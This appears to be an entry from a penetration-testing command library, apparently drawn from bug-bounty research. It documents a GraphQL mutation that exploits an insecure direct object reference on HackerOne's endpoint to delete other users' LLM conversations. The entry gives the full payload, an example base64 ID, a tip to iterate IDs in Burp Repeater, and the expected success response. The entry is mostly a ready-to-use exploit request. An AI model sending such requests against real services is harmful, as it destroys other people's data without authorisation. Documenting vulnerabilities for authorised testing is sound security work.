---
data: >-
  {"operationName":"DestroyLlmConversation","variables":{"llmConversationId":"#"},"query":"\n
  mutation DestroyLlmConversation($llmConversationId: ID!) {\n
  destroyConversation(input: { llm_conversation_id: $llmConversationId }) {\n
  destroyed\n }\n }\n"}
tags:
  - graphql
  - mutation
  - deletion
type: command
output: null
executor: graphql
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:48.173Z'
id: df528992-b581-47ae-88c8-cebff79a2a75
verified: false
validated: true
submitted: true
---
# destroy-llm-conversation

## Command

```json
{"operationName":"DestroyLlmConversation","variables":{"llmConversationId":"#"},"query":"\n mutation DestroyLlmConversation($llmConversationId: ID!) {\n destroyConversation(input: { llm_conversation_id: $llmConversationId }) {\n destroyed\n }\n }\n"}
```

## Description

GraphQL mutation request to delete an LLM conversation by ID, exploiting IDOR when using unauthorized IDs. Send via POST to HackerOne's GraphQL endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| operationName | Specifies the mutation as 'DestroyLlmConversation' | Yes |
| variables.llmConversationId | The target conversation ID (base64-encoded) | Yes |
| query | The mutation definition with input and destroyed field | Yes |

## Examples

### Basic Usage

Replace # with ID: ```json
{"operationName":"DestroyLlmConversation","variables":{"llmConversationId":"bGxtX2NvbnZlcnNhdGlvbjoxMjM0"},"query":"..."}
```

### Advanced Usage

Include in Burp Repeater for testing multiple IDs.

## Expected Output

JSON response: {"data":{"destroyConversation":{"destroyed":true}}} on success; errors if ID invalid.

## Related

- [[commands/reveal-copilot-gui]]
- [[procedures/Exploit-IDOR-to-Delete-Conversation]]
